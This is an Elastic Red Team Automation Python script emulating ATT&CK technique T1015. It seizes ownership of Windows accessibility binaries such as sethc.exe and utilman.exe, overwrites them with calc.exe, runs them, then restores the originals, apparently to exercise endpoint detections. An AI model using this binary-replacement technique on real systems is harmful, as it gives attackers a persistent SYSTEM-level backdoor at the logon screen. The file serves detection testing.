# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License;
# you may not use this file except in compliance with the Elastic License.

# Name: Overwrite Accessibiity Binaries
# RTA: sticky_keys_write_execute.py
# ATT&CK: T1015
# Description: Writes different binaries into various accessibility locations.

import os
import time

from . import common


@common.requires_os(common.WINDOWS)
def main():
    # Prep
    bins = ["sethc.exe", "utilman.exe", "narrator.exe", "magnify.exe", "osk.exe", "displayswitch.exe", "atbroker.exe"]
    calc = os.path.abspath("\\windows\\system32\\calc.exe")
    temp = os.path.abspath("temp.exe")

    # loop over bins
    for bin_name in bins:

        bin_path = os.path.abspath("\\Windows\\system32\\" + bin_name)

        # Back up bin
        common.copy_file(bin_path, temp)

        # Change Permissions to allow modification
        common.execute(["takeown", "/F", bin_path, "/A"])
        common.execute(["icacls", bin_path, "/grant", "Administrators:F"])

        # Copy Calc to overwrite binary, then run it
        common.copy_file(calc, bin_path)
        common.execute(bin_path, kill=True, timeout=1)

        # Restore Original File and Permissions on file
        common.copy_file(temp, bin_path)
        common.execute(["icacls", bin_path, "/setowner", "NT SERVICE\\TrustedInstaller"])
        common.execute(["icacls", bin_path, "/grant:r", "Administrators:RX"])
        common.remove_file(temp)

    # Cleanup
    time.sleep(2)
    common.execute(["taskkill", "/F", "/im", "calculator.exe"])


if __name__ == "__main__":
    exit(main())
